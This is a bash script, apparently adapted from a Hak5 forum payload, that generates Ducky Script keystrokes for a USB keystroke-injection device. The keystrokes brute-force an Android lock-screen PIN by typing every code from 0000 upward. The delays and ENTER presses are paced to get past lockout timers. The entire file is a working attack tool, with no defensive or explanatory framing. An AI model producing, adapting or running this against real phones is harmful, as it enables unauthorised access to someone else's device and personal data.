#!/bin/bash

# Based on script from keb0x80
# From the Hak5 Forum: https://forums.hak5.org/index.php?/topic/28165-payload-android-brute-force-4-digit-pin/

NUMBEROFDIGITS=$1

if [ -z ${NUMBEROFDIGITS} ] ; then
	NUMBEROFDIGITS=4
fi

UPPER=""
LOWER=""
for i in `seq 1 1 ${NUMBEROFDIGITS}`;
do
	LOWER=$LOWER"0"
	UPPER=$UPPER"9"
done

count=0
echo "DELAY 5000"
#for pin in {${LOWER}..${UPPER}}
for pin in `seq -w $LOWER 1 $UPPER`;
do
  count=$((count+1))
  echo "STRING $pin"
  # After every other pin, do this
  if [ $((count % 2)) -eq 0 ]; then
    echo "DELAY 1000"
    echo "ENTER"
    echo "ENTER"
  fi
  # After 5 pins, do this
  if [ $((count % 5)) -eq 0 ]; then
    for (( delay=0 ; $((delay < 4)) ; delay=$((delay+1)) ))
    do
	  echo "DELAY 5000"
	  echo "ENTER"
    done
  fi
done
